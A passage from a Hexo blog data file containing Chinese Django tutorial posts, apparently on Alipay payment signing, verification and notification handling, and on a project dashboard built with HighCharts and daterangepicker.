class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ordered_data</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        complex_keys = []</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> data.items():</span><br><span class="line">            <span class="keyword">if</span> isinstance(value, dict):</span><br><span class="line">                complex_keys.append(key)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将字典类型的数据dump出来</span></span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> complex_keys:</span><br><span class="line">            data[key] = json.dumps(data[key], separators=(<span class="string">','</span>, <span class="string">':'</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sorted([(k, v) <span class="keyword">for</span> k, v <span class="keyword">in</span> data.items()])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(self, unsigned_string)</span>:</span></span><br><span class="line">        <span class="comment"># 开始计算签名</span></span><br><span class="line">        key = self.app_private_key</span><br><span class="line">        signer = PKCS1_v1_5.new(key)</span><br><span class="line">        signature = signer.sign(SHA256.new(unsigned_string))</span><br><span class="line">        <span class="comment"># base64 编码，转换为unicode表示并移除回车</span></span><br><span class="line">        sign = encodebytes(signature).decode(<span class="string">"utf-8"</span>).replace(<span class="string">"\n"</span>, <span class="string">""</span>)</span><br><span class="line">        <span class="keyword">return</span> sign</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self, raw_content, signature)</span>:</span></span><br><span class="line">        <span class="comment"># 开始计算签名</span></span><br><span class="line">        key = self.alipay_public_key</span><br><span class="line">        signer = PKCS1_v1_5.new(key)</span><br><span class="line">        digest = SHA256.new()</span><br><span class="line">        digest.update(raw_content.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">        <span class="keyword">if</span> signer.verify(digest, decodebytes(signature.encode(<span class="string">"utf-8"</span>))):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(self, data, signature)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"sign_type"</span> <span class="keyword">in</span> data:</span><br><span class="line">            sign_type = data.pop(<span class="string">"sign_type"</span>)</span><br><span class="line">        <span class="comment"># 排序后的字符串</span></span><br><span class="line">        unsigned_items = self.ordered_data(data)</span><br><span class="line">        message = <span class="string">"&amp;"</span>.join(<span class="string">u"&#123;&#125;=&#123;&#125;"</span>.format(k, v) <span class="keyword">for</span> k, v <span class="keyword">in</span> unsigned_items)</span><br><span class="line">        <span class="keyword">return</span> self._verify(message, signature)</span><br></pre></td></tr></table></figure><h4 id="14-3-2-构造支付链接"><a href="#14-3-2-构造支付链接" class="headerlink" title="14.3.2 构造支付链接"></a>14.3.2 构造支付链接</h4><ul><li><p>构造支付链接的url</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^pay/$'</span>, home.pay, name=<span class="string">'pay'</span>),</span><br></pre></td></tr></table></figure></li><li><p>后端生成支付宝支付链接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pay</span><span class="params">(request)</span>:</span></span><br><span class="line">    conn = get_redis_connection()</span><br><span class="line">    key = <span class="string">'payment_&#123;&#125;'</span>.format(request.tracer.user.mobile_phone)</span><br><span class="line">    context_string = conn.get(key)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> context_string:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">'price'</span>)</span><br><span class="line">    context = json.loads(context_string.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 数据库中生成交易记录（待支付）</span></span><br><span class="line">    <span class="comment">#     等支付成功之后，我们需要把订单的状态更新为已支付、开始&amp;结束时间</span></span><br><span class="line">    order_id = uid(request.tracer.user.mobile_phone)</span><br><span class="line">    total_price = context[<span class="string">'total_price'</span>]</span><br><span class="line">    models.Transaction.objects.create(</span><br><span class="line">        status=<span class="number">1</span>,</span><br><span class="line">        order=order_id,</span><br><span class="line">        user=request.tracer.user,</span><br><span class="line">        price_policy_id=context[<span class="string">'policy_id'</span>],</span><br><span class="line">        count=context[<span class="string">'number'</span>],</span><br><span class="line">        price=total_price</span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># 生成支付链接</span></span><br><span class="line"></span><br><span class="line">    ali_pay = AliPay(</span><br><span class="line">        appid=settings.ALI_APPID,</span><br><span class="line">        app_notify_url=settings.ALI_NOTIFY_URL,</span><br><span class="line">        return_url=settings.ALI_RETURN_URL,</span><br><span class="line">        app_private_key_path=settings.ALI_PRI_KEY_PATH,</span><br><span class="line">        alipay_public_key_path=settings.ALI_PUB_KEY_PATH</span><br><span class="line">    )</span><br><span class="line">    query_params = ali_pay.direct_pay(</span><br><span class="line">        subject=<span class="string">"trace payment"</span>,  <span class="comment"># 商品简单描述</span></span><br><span class="line">        out_trade_no=order_id,  <span class="comment"># 商户订单号</span></span><br><span class="line">        total_amount=total_price</span><br><span class="line">    )</span><br><span class="line">    pay_url = <span class="string">"&#123;&#125;?&#123;&#125;"</span>.format(settings.ALI_GATEWAY, query_params)</span><br><span class="line">    <span class="keyword">return</span> redirect(pay_url)</span><br></pre></td></tr></table></figure></li></ul><h4 id="14-3-3-构造支付成功后返回的链接并生成订单记录到数据库中（沙箱环境无法成功）"><a href="#14-3-3-构造支付成功后返回的链接并生成订单记录到数据库中（沙箱环境无法成功）" class="headerlink" title="14.3.3 构造支付成功后返回的链接并生成订单记录到数据库中（沙箱环境无法成功）"></a>14.3.3 构造支付成功后返回的链接并生成订单记录到数据库中（沙箱环境无法成功）</h4><ul><li><p>构造支付成功后返回的链接的url</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^pay/notify/$'</span>, home.pay_notify, name=<span class="string">'pay_notify'</span>),</span><br></pre></td></tr></table></figure></li><li><p>后端处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pay_notify</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">""" 支付成功之后触发的URL """</span></span><br><span class="line">    ali_pay = AliPay(</span><br><span class="line">        appid=settings.ALI_APPID,</span><br><span class="line">        app_notify_url=settings.ALI_NOTIFY_URL,</span><br><span class="line">        return_url=settings.ALI_RETURN_URL,</span><br><span class="line">        app_private_key_path=settings.ALI_PRI_KEY_PATH,</span><br><span class="line">        alipay_public_key_path=settings.ALI_PUB_KEY_PATH</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="comment"># 只做跳转，判断是否支付成功了，不做订单的状态更新。</span></span><br><span class="line">        <span class="comment"># 支付吧会讲订单号返回：获取订单ID，然后根据订单ID做状态更新 + 认证。</span></span><br><span class="line">        <span class="comment"># 支付宝公钥对支付给我返回的数据request.GET 进行检查，通过则表示这是支付宝返还的接口。</span></span><br><span class="line">        params = request.GET.dict()</span><br><span class="line">        sign = params.pop(<span class="string">'sign'</span>, <span class="literal">None</span>)</span><br><span class="line">        status = ali_pay.verify(params, sign)</span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            <span class="string">"""</span></span><br><span class="line"><span class="string">            current_datetime = datetime.datetime.now()</span></span><br><span class="line"><span class="string">            out_trade_no = params['out_trade_no']</span></span><br><span class="line"><span class="string">            _object = models.Transaction.objects.filter(order=out_trade_no).first()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            _object.status = 2</span></span><br><span class="line"><span class="string">            _object.start_datetime = current_datetime</span></span><br><span class="line"><span class="string">            _object.end_datetime = current_datetime + datetime.timedelta(days=365 * _object.count)</span></span><br><span class="line"><span class="string">            _object.save()</span></span><br><span class="line"><span class="string">            """</span></span><br><span class="line">            <span class="keyword">return</span> HttpResponse(<span class="string">'支付完成'</span>)</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">'支付失败'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">from</span> urllib.parse <span class="keyword">import</span> parse_qs</span><br><span class="line">        body_str = request.body.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        post_data = parse_qs(body_str)</span><br><span class="line">        post_dict = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> post_data.items():</span><br><span class="line">            post_dict[k] = v[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        sign = post_dict.pop(<span class="string">'sign'</span>, <span class="literal">None</span>)</span><br><span class="line">        status = ali_pay.verify(post_dict, sign)</span><br><span class="line">        <span class="keyword">if</span> status:</span><br><span class="line">            current_datetime = datetime.datetime.now()</span><br><span class="line">            out_trade_no = post_dict[<span class="string">'out_trade_no'</span>]</span><br><span class="line">            _object = models.Transaction.objects.filter(order=out_trade_no).first()</span><br><span class="line"></span><br><span class="line">            _object.status = <span class="number">2</span></span><br><span class="line">            _object.start_datetime = current_datetime</span><br><span class="line">            _object.end_datetime = current_datetime + datetime.timedelta(days=<span class="number">365</span> * _object.count)</span><br><span class="line">            _object.save()</span><br><span class="line">            <span class="keyword">return</span> HttpResponse(<span class="string">'success'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">'error'</span>)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 支付 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>概览 &amp; 统计</title>
      <link href="/2020/08/02/13%20%E6%A6%82%E8%A7%88%20&amp;%20%E7%BB%9F%E8%AE%A1/"/>
      <url>/2020/08/02/13%20%E6%A6%82%E8%A7%88%20&amp;%20%E7%BB%9F%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="13-概览-amp-统计"><a href="#13-概览-amp-统计" class="headerlink" title="13 概览 &amp; 统计"></a>13 概览 &amp; 统计</h2><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E6%A6%82%E8%A7%88%E9%A1%B5%E9%9D%A2.jpg"  alt="概览页面"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E7%BB%9F%E8%AE%A1%E9%A1%B5%E9%9D%A2.jpg"  alt="统计页面"></p><h3 id="13-1知识点"><a href="#13-1知识点" class="headerlink" title="13.1知识点"></a>13.1知识点</h3><h4 id="1-django时区"><a href="#1-django时区" class="headerlink" title="1. django时区"></a>1. django时区</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># datetime.datetime.now() / datetime.datetime.utcnow() =&gt; UTC 时间</span></span><br><span class="line"><span class="comment"># TIME_ZONE = 'UTC'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># datetime.datetime.now() =&gt; 东八区时间 / datetime.datetime.utcnow() =&gt; UTC 时间</span></span><br><span class="line">TIME_ZONE = <span class="string">'Asia/shanghai'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 影响自动生成数据库时间字段</span></span><br><span class="line"><span class="comment"># USE_TZ = True，创建UTC时间</span></span><br><span class="line"><span class="comment"># USE_TZ = False，根据TIME_ZONE设置的时区进行创建时间并写入到数据库中</span></span><br><span class="line">USE_TZ = <span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="2-网页画图"><a href="#2-网页画图" class="headerlink" title="2.  网页画图"></a>2.  网页画图</h4><p>网页画图：HighCharts / Echarts</p><ul><li>下载 HighCharts </li></ul><p><a href="https://www.highcharts.com.cn/download" target="_blank" rel="noopener">https://www.highcharts.com.cn/download</a></p><ul><li><p>引用js</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://cdn.highcharts.com.cn/highcharts/8.1.2/highcharts.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>构建div</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"chart"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>配置 HighChart</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> chart = Highcharts.chart(<span class="string">'container'</span>, &#123;</span></span><br><span class="line">            title: &#123;</span><br><span class="line"><span class="actionscript">                    text: <span class="string">'2010 ~ 2016 年太阳能行业就业人员发展情况'</span></span></span><br><span class="line">            &#125;,</span><br><span class="line">            subtitle: &#123;</span><br><span class="line"><span class="actionscript">                    text: <span class="string">'数据来源：thesolarfoundation.com'</span></span></span><br><span class="line">            &#125;,</span><br><span class="line">            yAxis: &#123;</span><br><span class="line">                    title: &#123;</span><br><span class="line"><span class="actionscript">                            text: <span class="string">'就业人数'</span></span></span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            legend: &#123;</span><br><span class="line"><span class="actionscript">                    layout: <span class="string">'vertical'</span>,</span></span><br><span class="line"><span class="actionscript">                    align: <span class="string">'right'</span>,</span></span><br><span class="line"><span class="actionscript">                    verticalAlign: <span class="string">'middle'</span></span></span><br><span class="line">            &#125;,</span><br><span class="line">            plotOptions: &#123;</span><br><span class="line">                    series: &#123;</span><br><span class="line">                            label: &#123;</span><br><span class="line"><span class="actionscript">                                    connectorAllowed: <span class="literal">false</span></span></span><br><span class="line">                            &#125;,</span><br><span class="line">                            pointStart: 2010</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            series: [&#123;</span><br><span class="line"><span class="actionscript">                    name: <span class="string">'安装，实施人员'</span>,</span></span><br><span class="line">                    data: [43934, 52503, 57177, 69658, 97031, 119931, 137133, 154175]</span><br><span class="line">            &#125;, &#123;</span><br><span class="line"><span class="actionscript">                    name: <span class="string">'工人'</span>,</span></span><br><span class="line">                    data: [24916, 24064, 29742, 29851, 32490, 30282, 38121, 40434]</span><br><span class="line">            &#125;, &#123;</span><br><span class="line"><span class="actionscript">                    name: <span class="string">'销售'</span>,</span></span><br><span class="line">                    data: [11744, 17722, 16005, 19771, 20185, 24377, 32147, 39387]</span><br><span class="line">            &#125;, &#123;</span><br><span class="line"><span class="actionscript">                    name: <span class="string">'项目开发'</span>,</span></span><br><span class="line"><span class="actionscript">                    data: [<span class="literal">null</span>, <span class="literal">null</span>, <span class="number">7988</span>, <span class="number">12169</span>, <span class="number">15112</span>, <span class="number">22452</span>, <span class="number">34400</span>, <span class="number">34227</span>]</span></span><br><span class="line">            &#125;, &#123;</span><br><span class="line"><span class="actionscript">                    name: <span class="string">'其他'</span>,</span></span><br><span class="line">                    data: [12908, 5948, 8105, 11248, 8989, 11816, 18274, 18111]</span><br><span class="line">            &#125;],</span><br><span class="line">            responsive: &#123;</span><br><span class="line">                    rules: [&#123;</span><br><span class="line">                            condition: &#123;</span><br><span class="line">                                    maxWidth: 500</span><br><span class="line">                            &#125;,</span><br><span class="line">                            chartOptions: &#123;</span><br><span class="line">                                    legend: &#123;</span><br><span class="line"><span class="actionscript">                                            layout: <span class="string">'horizontal'</span>,</span></span><br><span class="line"><span class="actionscript">                                            align: <span class="string">'center'</span>,</span></span><br><span class="line"><span class="actionscript">                                            verticalAlign: <span class="string">'bottom'</span></span></span><br><span class="line">                                    &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                    &#125;]</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="3-daterangepicker插件"><a href="#3-daterangepicker插件" class="headerlink" title="3. daterangepicker插件"></a>3. daterangepicker插件</h4><p>用于选择日期范围，日期和时间的JavaScript组件。</p><ul><li>下载daterangepicker插件</li></ul><p><a href="https://www.daterangepicker.cn/" target="_blank" rel="noopener">https://www.daterangepicker.cn/</a></p><ul><li><p>引用css &amp; js </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'plugin/daterangepicker/daterangepicker.css' %&#125;"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/daterangepicker/moment.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/daterangepicker/daterangepicker.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>配置daterangepicker</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">       $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line">           initDateRangePicker();</span><br><span class="line">       &#125;);</span><br><span class="line">  </span><br><span class="line"><span class="actionscript">       <span class="function"><span class="keyword">function</span> <span class="title">initDateRangePicker</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">           <span class="keyword">var</span> option = &#123;</span></span><br><span class="line"><span class="actionscript">               maxDate: moment(),   <span class="comment">// 最多只能选当前一天，后面不能选择</span></span></span><br><span class="line"><span class="actionscript">               alwaysShowCalendars: <span class="literal">true</span>,   <span class="comment">//  显示日历</span></span></span><br><span class="line"><span class="actionscript">               showWeekNumbers: <span class="literal">true</span>,   <span class="comment">// 显示星期</span></span></span><br><span class="line"><span class="actionscript">               ranges: &#123;    <span class="comment">//  自定义时间</span></span></span><br><span class="line"><span class="actionscript">                   <span class="string">'今天'</span>: [moment(), moment()],</span></span><br><span class="line"><span class="actionscript">                   <span class="string">'昨天'</span>: [moment().subtract(<span class="number">1</span>, <span class="string">'day'</span>), moment().subtract(<span class="number">1</span>, <span class="string">'day'</span>)],</span></span><br><span class="line"><span class="actionscript">                   <span class="string">'最近7天'</span>: [moment().subtract(<span class="number">6</span>, <span class="string">'day'</span>), moment()],</span></span><br><span class="line"><span class="actionscript">                   <span class="string">'最近30天'</span>: [moment().subtract(<span class="number">29</span>, <span class="string">'day'</span>), moment()],</span></span><br><span class="line"><span class="actionscript">                   <span class="string">'本月'</span>: [moment().startOf(<span class="string">'month'</span>), moment().endOf(<span class="string">'month'</span>)],</span></span><br><span class="line">               &#125;,</span><br><span class="line">               locale: &#123;</span><br><span class="line"><span class="actionscript">                   format: <span class="string">'YYYY-MM-DD'</span>,</span></span><br><span class="line"><span class="actionscript">                   separator: <span class="string">' 至 '</span>,</span></span><br><span class="line"><span class="actionscript">                   applyLabel: <span class="string">'确定'</span>,</span></span><br><span class="line"><span class="actionscript">                   cancelLabel: <span class="string">'取消'</span>,</span></span><br><span class="line"><span class="actionscript">                   fromLabel: <span class="string">'开始'</span>,</span></span><br><span class="line"><span class="actionscript">                   toLabel: <span class="string">'结束'</span>,</span></span><br><span class="line"><span class="actionscript">                   customRangeLabel: <span class="string">'自定义'</span>,</span></span><br><span class="line"><span class="actionscript">                   weekLabel: <span class="string">'W'</span>,</span></span><br><span class="line"><span class="actionscript">                   daysOfWeek: [<span class="string">'一'</span>, <span class="string">'二'</span>, <span class="string">'三'</span>, <span class="string">'四'</span>, <span class="string">'五'</span>, <span class="string">'六'</span>, <span class="string">'日'</span>],</span></span><br><span class="line"><span class="actionscript">                   monthNames: [<span class="string">'一月'</span>, <span class="string">'二月'</span>, <span class="string">'三月'</span>, <span class="string">'四月'</span>, <span class="string">'五月'</span>, <span class="string">'六月'</span>, <span class="string">'七月'</span>, <span class="string">'八月'</span>, <span class="string">'九月'</span>, <span class="string">'十月'</span>, <span class="string">'十一月'</span>, <span class="string">'十二月'</span>],</span></span><br><span class="line">                   firstDay: 1</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;;</span><br><span class="line"><span class="javascript">           $(<span class="string">'#rangePicker'</span>).daterangepicker(option, <span class="function"><span class="keyword">function</span> (<span class="params">start, end, label</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">               <span class="comment">// 选择时间后函数自动被触发</span></span></span><br><span class="line"><span class="javascript">               <span class="built_in">console</span>.log(start.format(<span class="string">'YYYY-MM-DD'</span>), end.add(<span class="number">1</span>,<span class="string">'day'</span>).format(<span class="string">'YYYY-MM-DD'</span>));</span></span><br><span class="line">           &#125;);</span><br><span class="line">       &#125;</span><br><span class="line">   <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="13-2-概览"><a href="#13-2-概览" class="headerlink" title="13.2 概览"></a>13.2 概览</h3><h4 id="13-2-1-构造概览页面的url地址"><a href="#13-2-1-构造概览页面的url地址" class="headerlink" title="13.2.1 构造概览页面的url地址"></a>13.2.1 构造概览页面的url地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    <span class="comment"># 概览页面</span></span><br><span class="line">    url(<span class="string">r'^dashboard/$'</span>, dashboard.dashboard, name=<span class="string">'dashboard'</span>),</span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure><h4 id="13-2-2-概览页面的视图函数"><a href="#13-2-2-概览页面的视图函数" class="headerlink" title="13.2.2 概览页面的视图函数"></a>13.2.2 概览页面的视图函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dashboard</span><span class="params">(request,project_id)</span>:</span></span><br><span class="line">    <span class="string">"""概览"""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 问题处理</span></span><br><span class="line">    status_dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> key,text <span class="keyword">in</span> models.Issues.status_choices:</span><br><span class="line">        status_dict[key] = &#123;<span class="string">'text'</span>:text,<span class="string">'count'</span>:<span class="number">0</span>&#125;</span><br><span class="line">    issues_data = models.Issues.objects.filter(project_id=project_id).values(<span class="string">'status'</span>).annotate(ct=Count(<span class="string">'id'</span>))</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> issues_data:</span><br><span class="line">        status_dict[item[<span class="string">'status'</span>]][<span class="string">'count'</span>] = item[<span class="string">'ct'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 项目的成员</span></span><br><span class="line">    user_list = models.ProjectUser.objects.filter(project_id=project_id).values(<span class="string">'user_id'</span>, <span class="string">'user__username'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 最近的10个问题</span></span><br><span class="line">    top_ten = models.Issues.objects.filter(project_id=project_id ,assign__isnull=<span class="literal">False</span>).order_by(<span class="string">'-id'</span>)[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'status_dict'</span>:status_dict,</span><br><span class="line">        <span class="string">'user_list'</span>:user_list,</span><br><span class="line">        <span class="string">'top_ten'</span>:top_ten,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">'manage/dashboard.html'</span>,context   )</span><br></pre></td></tr></table></figure><h4 id="13-2-2-概览页面的前端页面"><a href="#13-2-2-概览页面的前端页面" class="headerlink" title="13.2.2 概览页面的前端页面"></a>13.2.2 概览页面的前端页面</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 